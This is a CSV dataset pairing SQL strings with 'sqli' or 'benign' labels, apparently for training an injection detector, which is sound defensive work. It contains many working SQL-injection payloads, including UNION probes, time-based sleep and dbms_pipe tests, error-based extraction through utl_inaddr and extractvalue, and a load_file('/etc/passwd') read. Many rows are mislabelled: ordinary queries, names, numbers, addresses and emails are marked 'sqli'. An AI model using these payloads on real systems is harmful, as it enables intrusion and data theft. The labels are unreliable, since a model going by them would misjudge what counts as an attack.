query,label
"INSERT INTO `wp_options`  ( `option_name`, `option_value`, `autoload` )  VALUES  ( '_transient_doing_cron', '1630907689.8412559032440185546875', 'yes' )  ON DUPLICATE KEY UPDATE `option_name`  =  VALUES ( `option_name` ) , `option_value`  =  VALUES ( `option_value` ) , `autoload`  =  VALUES ( `autoload` ) ",sqli
itrabo,sqli
SELECT TOP 3 * FROM mix,sqli
"-2434  )   union all select 8310,8310,8310,8310,8310--",sqli
SELECT DISTINCT corner FROM shore,sqli
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'tmdj' like 'tmdj",sqli
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'zovb' like 'zovb",sqli
palls de buran,sqli
"1%""  )   and   (  6016  =  4763  )  *4763 and   (  ""%""  =  """,sqli
SELECT TOP 50 PERCENT * FROM leaf SELECT * FROM store FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wife,sqli
1'  )   as jrqh where 6204  =  6204 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sqli
"   SELECT COUNT ( pond ) , sale FROM mission BY atmosphere",sqli
1   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   1260  =  1260,sqli
SELECT DISTINCT hang FROM sudden,sqli
"  SELECT crop AS suit, about AS [listen]  FROM throat",sqli
grodecki,sqli
 UPDATE rhythm SET moment = 'purpose'WHERE mice = 'torn',sqli
" SELECT * FROM dropped ORDER BY bank ASC, fog DESC",sqli
flori@casabolsa43.np,sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9053 )  ORDER BY meta_id ASC",sqli
"  SELECT roomID AS ID, modern AS total FROM statement",sqli
siede@comodepilarse.ye,sqli
1 where 1931  =  1931 and sleep  (  5  )  --,sqli
"1  )   as lhie where 4631  =  4631 union all select null,null,null,null,null--",sqli
"1'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli
SELECT * FROM leave ORDER BY musical,sqli
"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",sqli
SELECT COUNT ( occur )  FROM trap,sqli
4560,sqli
"-8667'+  (  select ymmg where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",sqli
"1'   )    )    as efmy where 7299  =  7299 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
SELECT * FROM salt,sqli
8541240000000000,sqli
"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",sqli
SELECT COUNT ( softID ) FROM top,sqli
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,sqli
SELECT * FROM hung WHERE already = 'greatest'  AND  ( sun = 'ahead' OR characteristic = 'one' ) ,sqli
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",sqli
"1%""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,sqli
-6122'   )    )     )   or 9243  =  6161--,sqli
celfa,sqli
"1""  )   and 3732  =  3850 and   (  ""edjv""  =  ""edjv",sqli
"1' where 9961  =  9961 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
darcy@google-movil.dz,sqli
waitfor delay '0:0:5'-- thuo,sqli
"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
3015,sqli
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw,sqli
SELECT AVG ( touch ) FROM then,sqli
SELECT * FROM  ( SELECT minerals FROM hand ) ,sqli
SELECT * FROM swam WHERE pencil BETWEEN 'rays' AND 'according',sqli
clarucha,sqli
"calle ponte vella s/n, 13e",sqli
yaci,sqli
"  SELECT mindID AS ID, burst AS grade FROM stock",sqli
"SELECT * FROM exchange WHERE best BETWEEN ""taught"" AND    ""involved""",sqli
orazio,sqli
FROM  ( SELECT DISTINCT raise FROM spring ) ,sqli
1'  )   where 9175  =  9175,sqli
"calle ducado de neopatria 63, 12-h",sqli
SELECT * FROM control WHERE remain IN  ( SELECT morning FROM blue ) ,sqli
verani@viajesdacapalla.gq,sqli
vai@sexplorador.mk,sqli
ensminge,sqli
-1802' or 7931  =  5841--,sqli
SELECT TOP 50 PERCENT * FROM saved SELECT * FROM detail FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM two,sqli
SELECT TOP 3 * FROM steep WHERE off = 'captain',sqli
"SELECT DAY ( ""2017-06-15 09:34:21"" ) ;",sqli
2,sqli
"-8506'   )    )     )   union all select 1950,1950,1950,1950,1950,1950--",sqli
DELETE FROM thumb WHERE rise = 'review',sqli
"   SELECT Employees.machine, COUNT ( Orders.grewID )  AS parallelFROM    ( OrdersINNER JOIN those ON Orders.showID  =  Employees.propertyID ) ",sqli
1'||  (  select 'dyuw' from dual where 2037  =  2037,sqli
"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
"  SELECT MINUTE ( ""2017-06-20 09:34:00"" ) ;",sqli
SELECT AVG ( several ) FROM upward SELECT SUM ( identity ) ,sqli
SELECT TOP 3 * FROM sold WHERE coast = 'must',sqli
SELECT * FROM wp_posts WHERE ID  =  347682 LIMIT 1,sqli
" end and   (  ""vwbx""  =  ""vwbx",sqli
SELECT AVG ( swam ) FROM talk SELECT SUM ( today ) ,sqli
1937550000000000,sqli
"  SELECT Orders.breadrID, Employees.mountain, Employees.compass FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.societyID ORDER BY Orders.vaporID",sqli
SELECT nose ( s )  FROM muscle SELECT musical ( s ) ,sqli
SELECT * FROM storm WHERE damage = 'married'  OR cattle = 'pipe',sqli
SELECT camera ( s )  FROM principle,sqli
SELECT * FROM park WHERE tried  BETWEEN 10 AND 20,sqli
1 or sleep  (  5  ) ,sqli
"-7307'   )    )    union all select 5215,5215,5215,5215--",sqli
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,sqli
"-3102  )   union all select 6707,6707,6707,6707--",sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sqli
"-5360' where 8178  =  8178 union all select 8178,8178,8178--",sqli
"   SELECT COUNT ( promised ) , forth FROM friend BY card",sqli
SELECT gone FROM simplest UNION ALL SELECT store FROM walk ORDER BY evening,sqli
"   SELECT morning,sets,basket,iron,hang     (  (  wagon JOIN forest ON congress.after =  little.characteristic )   INNER JOIN slowON Orders.ourselves =  brief.holdID ) ",sqli
1  )   where 6035  =  6035,sqli
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt",sqli
"   SELECT opposite, situation, foot FROM soft WHERE buffalo  IS NULL",sqli
"   SELECT jet, city+ ', ' + soil+ ' ' + growth+ ', ' + entire AS wrote  FROM play",sqli
1272,sqli
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",sqli
SELECT * FROM having 3,sqli
"avinguda castellot, 116,",sqli
SELECT COUNT ( thumb ) FROM elephant,sqli
SELECT * FROM prize 3,sqli
SELECT learn ( s )  FROM decide FULL OUTER JOIN,sqli
"1'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
SELECT * FROM classroom WHERE apple NOT LIKE '[fun]%',sqli
"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",sqli
SELECT * FROM strength FETCH FIRST 50 PERCENT ROWS ONLY,sqli
"  SELECT PERIOD_DIFF ( 201710, 201703 ) ;",sqli
SELECT COUNT ( DISTINCT theory )  FROM stairs,sqli
SELECT TOP 3 * FROM themselves WHERE principal = 'art' SELECT * FROM across,sqli
1'||  (  select 'goen' from dual where 8586  =  8586,sqli
" select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",sqli
"  SELECT Orders.zerorID, Employees.as, Employees.fireplace FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.solidID ORDER BY Orders.structureID",sqli
SELECT * FROM dollar WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',sqli
"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
" SELECT * FROM missing ORDER BY string, along",sqli
SELECT COUNT ( tightID ) FROM noted,sqli
"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",sqli
SELECT * FROM discuss,sqli
SELECT AVG ( Price ) FROM fastened,sqli
sisante,sqli
SELECT melted FROM strange,sqli
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",sqli
SELECT * FROM street FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM garage,sqli
SELECT * FROM straight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM travel,sqli
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""jbty"" like ""jbty",sqli
SELECT * FROM origin 3,sqli
1i515s7d7d,sqli
fischetti.bacall@players.com.gr,sqli
SELECT * FROM orders WHERE user_id=161 ORDER BY created_at DESC LIMIT 10,benign
SELECT * FROM root WHERE recently = 'parts'  AND City = 'potatoes',sqli
a65esad0,sqli
SELECT * FROM  ( SELECT dull FROM wire ) ,sqli
calle juan agui 97 9-e,sqli
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",sqli
"1%""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""%""  =  """,sqli
gaulle,sqli
"doctor ramon sanchez-parra, 17 11?d",sqli
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,sqli
if  (  4735  =  8907  )   select 4735 else drop function qigo--,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",sqli
8230,sqli
"1""  )   where 1699  =  1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
anjali,sqli
SELECT TOP 3 * FROM loud,sqli
"1"" where 3692  =  3692 union all select null,null--",sqli
galdo palacn,sqli
"-7313""  )   where 3606  =  3606 union all select 3606#",sqli
begues,sqli
1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sqli
beckwith,sqli
SELECT * FROM can ORDER BY most DESC,sqli
nooshin,sqli
remiendo,sqli
SELECT * FROM system WHERE she = 'meet' LIMIT 3,sqli
13791863m,sqli
SELECT * FROM minute WHERE story = 'student'  AND City = 'bill',sqli
SELECT president FROM any UNION ALL SELECT this FROM sunlight ORDER BY driver,sqli
"-5998%""  )   union all select 2366,2366,2366,2366#",sqli
lilien@aprendeaestudiar.lt,sqli
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'yaim'  =  'yaim,sqli
matungo,sqli
" SELECT * FROM rays ORDER BY parallel, milk",sqli
SELECT * FROM see FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM our,sqli
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'hube'  =  'hube",sqli
91394289v,sqli
SELECT * FROM hearing,sqli
desans totohuetotzint,sqli
"calle valsendero, 48,",sqli
"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",sqli
"-1550%""   )    )     )   order by 1--",sqli
SELECT price FROM products WHERE sku='SKU4261',benign
" SELECT * FROM Customers  ORDER BY Country ASC, CustomerName DESC;",sqli
"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",sqli
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'zqiw'  =  'zqiw,sqli
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",sqli
SELECT * FROM entire WHERE soldier BETWEEN '1996-07-01' AND '1996-07-31',sqli
"  SELECT pleasant,excited,spend FROM arm LEFT JOIN Orders ON get.winID =  rice.there ORDER BY community.work",sqli
SELECT * FROM dust ORDER BY could DESC,sqli
regir,sqli
"1 union all select null,null,null,null,null,null,null,null,null,null#",sqli
"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",sqli
select   (  case when   (  2350  =  8682  )   then 2350 else 1/  (  select 0  )   end  )  --,sqli
1'  )   as gdie where 8133  =  8133 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,sqli
"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",sqli
SELECT option_value FROM wp_options WHERE option_name  =  'webp-express-alter-html' LIMIT 1,sqli
"1   )    )    union all select null,null#",sqli
"  SELECT Orders.easierrID, Employees.organized, Employees.general FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.courtID ORDER BY Orders.soonID",sqli
girona,sqli
"-9718%""  )   union all select 9515,9515,9515#",sqli
quilley0@frenchpolynesia.com.st,sqli
eial,sqli
"0"" encoding  =  ""utf-8"" ?>   <_filter>  <![CDATA[insert]]>  </_filter>   <_filter>  <![CDATA[signup]]>  </_filter>   <_filter>  <![CDATA[widget_login]]>  </_filter>   <a href  =  ""http://caritaskinshasa",sqli
SELECT AVG ( Price ) FROM western,sqli
"1'+  (  select 'sbvh' where 8539  =  8539 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",sqli
-4262%'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',sqli
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",sqli
"-1275"" union all select 7861,7861,7861,7861,7861#",sqli
" SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM  ( Orders INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID )  GROUP BY LastName HAVING COUNT ( Orders.OrderID )  > 10;",sqli
"1"" where 9804  =  9804 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'dphz'  =  'dphz",sqli
1'||  (  select 'dajl' from dual where 8440  =  8440,sqli
SELECT option_value FROM wp_options WHERE option_name  =  'options_twitter_url' LIMIT 1,sqli
49130,sqli
"1   )    )    as nnpe where 9720  =  9720 union all select null,null,null,null,null,null,null,null,null#",sqli
1990570000000000,sqli
"  SELECT fruitID AS ID, aware AS select FROM society",sqli
SELECT * FROM brass WHERE activity = 'closely'  AND City = 'willing',sqli
"  UPDATE everywhere SET volume =  'moment', City =  'place' WHERE several =  labor",sqli
8421939999999999,sqli
-2992%'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',sqli
SELECT * FROM invented WHERE remember BETWEEN 'nearer' AND 'rose',sqli
SELECT * FROM create  WHERE heading = send,sqli
vilagut victori,sqli
"   SELECT late, properly, furniture FROM travel WHERE fort  IS NULL",sqli
SELECT * FROM goes  WHERE any NOT LIKE '[crew]%',sqli
SELECT future ( s )  FROM laid SELECT tight FROM writing,sqli
select   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  select 0  )   end  )  --,sqli
SELECT * FROM sharp WHERE lake BETWEEN '1996-07-01' AND '1996-07-31',sqli
SELECT * FROM  ( SELECT plant FROM breakfast ) ,sqli
la,sqli
1'||  (  select 'svnn' from dual where 8710  =  8710,sqli
98011650w,sqli
DELETE FROM bush WHERE deal = 'inside',sqli
"select * from generate_series  (  9058,9058,case when   (  9058  =  1183  )   then 1 else 0 end  )   limit 1--",sqli
"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",sqli
20001,sqli
ana,sqli
kamber@weat.gd,sqli
"1"" where 9014  =  9014 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",sqli
"   SELECT lovely, section, not FROM thou WHERE amount  IS NULL",sqli
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,sqli
SELECT * FROM local ORDER BY pet,sqli
SELECT * FROM central WHERE experience = 'movement',sqli
"SELECT ID, post_title, post_name FROM wp_posts WHERE post_type  =  'wpcf7_contact_form'",sqli
5956390000000000,sqli
bizantina,sqli
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,sqli
SELECT * FROM  ( SELECT particles FROM mission ) ,sqli
SELECT * FROM popular WHERE broke = 'thou' FETCH FIRST 3 ROWS ONLY,sqli
SELECT * FROM basic WHERE please BETWEEN '1996-07-01' AND '1996-07-31',sqli
-3499'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap,sqli
 or ''*',sqli
"INSERT INTO products (id, email) VALUES ('y', '2')",benign
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",sqli
28413,sqli
6052580000000000,sqli
SELECT * FROM worker WHERE heading = 'due' FETCH FIRST 3 ROWS ONLY,sqli
"INSERT INTO specific  ( did, simplest, happily )  VALUES  ( 'great', 'left', 'above' )  ",sqli
1%'  )   and 9226  =  7542--,sqli
1'+  (  select 'rqok' where 5074  =  5074 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',sqli
"1  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
SELECT * FROM floating WHERE magic NOT BETWEEN 'worse' AND 'conversation',sqli
18129,sqli
"-6129 union all select 9122,9122#",sqli
46266,sqli
"   SELECT Employees.grade, COUNT ( Orders.fineID )  AS chemicalFROM    ( OrdersINNER JOIN growth ON Orders.thenID  =  Employees.aloneID ) ",sqli
"1 and elt  (  4249  =  4249,7259  )  ",sqli
SELECT * FROM exchange  WHERE taught NOT LIKE '[laid]%',sqli
1' and 2316  =  7236,sqli
"1 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli
